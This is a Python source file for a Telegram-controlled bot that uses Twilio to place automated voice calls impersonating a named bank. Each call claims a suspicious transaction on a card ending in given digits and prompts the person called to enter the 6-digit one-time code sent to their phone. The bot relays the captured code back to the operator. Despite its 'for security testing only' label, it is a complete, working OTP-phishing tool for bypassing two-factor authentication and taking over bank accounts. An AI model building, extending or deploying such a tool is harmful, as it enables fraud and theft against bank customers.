import os
import sys
import traceback
import requests
import asyncio
from flask import Flask, request, jsonify
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.rest import Client
from telegram import Update
from telegram.ext import Application, CommandHandler, ConversationHandler, ContextTypes, MessageHandler, filters

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
if not TELEGRAM_TOKEN:
    print("ERROR: TELEGRAM_BOT_TOKEN environment variable not set")
    sys.exit(1)

TWILIO_SID = os.environ.get('TWILIO_ACCOUNT_SID')
TWILIO_AUTH = os.environ.get('TWILIO_AUTH_TOKEN')
TWILIO_FROM = os.environ.get('TWILIO_FROM_NUMBER')
BASE_URL = os.environ.get('RENDER_URL', 'https://otp-getter.onrender.com')

print(f"DEBUG: BASE_URL = {BASE_URL}")
print(f"DEBUG: TWILIO_FROM = {TWILIO_FROM}")
print(f"DEBUG: TELEGRAM_TOKEN starts with {TELEGRAM_TOKEN[:10]}...")

# Conversation states
PHONE, BANK, AMOUNT, CARD_LAST4 = range(4)

# Store user data
user_data = {}

app = Flask(__name__)

# ==================== TELEGRAM HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔐 *OTP Testing Bot*\n\nSend /call to start.\n\n*For security testing only.*",
        parse_mode='Markdown'
    )

async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id] = {}
    await update.message.reply_text("📞 Send phone number (e.g., +447123456789)")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id]['phone'] = update.message.text.strip()
    await update.message.reply_text("🏦 Send bank name")
    return BANK

async def get_bank(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id]['bank'] = update.message.text.strip()
    await update.message.reply_text("💰 Send transaction amount")
    return AMOUNT

async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id]['amount'] = update.message.text.strip()
    await update.message.reply_text("💳 Send last 4 digits of card")
    return CARD_LAST4

async def get_card_last4(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = user_data.get(user_id, {})
    phone = data.get('phone')
    bank = data.get('bank')
    amount = data.get('amount')
    card_last4 = update.message.text.strip()
    
    if not phone or not bank or not amount:
        await update.message.reply_text("❌ Session expired. Please send /call again.")
        return ConversationHandler.END
    
    await update.message.reply_text(f"📞 Calling {phone}...\nBank: {bank}\nAmount: ${amount}\nCard ending: {card_last4}")
    
    try:
        client = Client(TWILIO_SID, TWILIO_AUTH)
        voice_url = f"{BASE_URL}/voice?bank={bank}&amount={amount}&card_last4={card_last4}&chat_id={update.effective_chat.id}"
        call = client.calls.create(to=phone, from_=TWILIO_FROM, url=voice_url, method='POST')
        await update.message.reply_text(f"✅ Call initiated! Call SID: {call.sid}\n\nWaiting for OTP entry...")
    except Exception as e:
        await update.message.reply_text(f"❌ Call failed: {str(e)}")
        print(f"Twilio error: {e}")
    
    del user_data[user_id]
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.")
    return ConversationHandler.END

# ==================== FLASK ENDPOINTS ====================
@app.route("/webhook", methods=['POST'])
def telegram_webhook():
    """Handle incoming Telegram updates with full error logging"""
    try:
        print("DEBUG: Webhook received a POST request")
        
        # Get the JSON data
        json_data = request.get_json(force=True)
        print(f"DEBUG: JSON data received: {str(json_data)[:200]}...")
        
        # Create application for this request
        application = Application.builder().token(TELEGRAM_TOKEN).build()
        print("DEBUG: Application built successfully")
        
        # Add handlers
        application.add_handler(CommandHandler('start', start))
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler('call', call_command)],
            states={
                PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
                BANK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank)],
                AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
                CARD_LAST4: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_card_last4)],
            },
            fallbacks=[CommandHandler('cancel', cancel)],
        )
        application.add_handler(conv_handler)
        print("DEBUG: Handlers added")
        
        # Process update
        update = Update.de_json(json_data, application.bot)
        print(f"DEBUG: Update created: {update}")
        
        asyncio.run(application.process_update(update))
        print("DEBUG: Update processed successfully")
        
        return "ok", 200
        
    except Exception as e:
        print(f"ERROR in webhook: {str(e)}")
        print(f"ERROR traceback: {traceback.format_exc()}")
        return f"error: {str(e)}", 500

@app.route("/voice", methods=['GET', 'POST'])
def voice():
    response = VoiceResponse()
    
    if 'Digits' in request.values:
        digits = request.values['Digits']
        chat_id = request.args.get('chat_id')
        if chat_id:
            send_telegram_message(chat_id, f"✅ OTP captured: {digits}")
        response.say("Thank you. Goodbye.")
        response.hangup()
        return str(response)
    
    bank_name = request.args.get('bank', 'your bank')
    amount = request.args.get('amount', '500')
    card_last4 = request.args.get('card_last4', '1234')
    
    gather = Gather(num_digits=6, action='/voice', method='POST', timeout=10)
    gather.say(f"Hello. This is an automated security call from {bank_name}.")
    gather.say(f"We detected a transaction of {amount} dollars on card ending in {card_last4}.")
    gather.say("Please enter the 6-digit code sent to your phone.")
    response.append(gather)
    
    return str(response)

@app.route("/", methods=['GET'])
def index():
    return "OTP Bot is running."

@app.route("/debug", methods=['GET'])
def debug():
    """Debug endpoint to check environment variables"""
    return {
        "base_url": BASE_URL,
        "twilio_from": TWILIO_FROM,
        "telegram_token_set": bool(TELEGRAM_TOKEN),
        "twilio_creds_set": bool(TWILIO_SID and TWILIO_AUTH)
    }

def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={'chat_id': chat_id, 'text': text})
    except Exception as e:
        print(f"Telegram send error: {e}")

# ==================== RUN ====================
if __name__ == "__main__":
    print("Starting OTP Bot on Render with DEBUG logging...")
    print(f"Python version: {sys.version}")
    app.run(host='0.0.0.0', port=5000, debug=True)
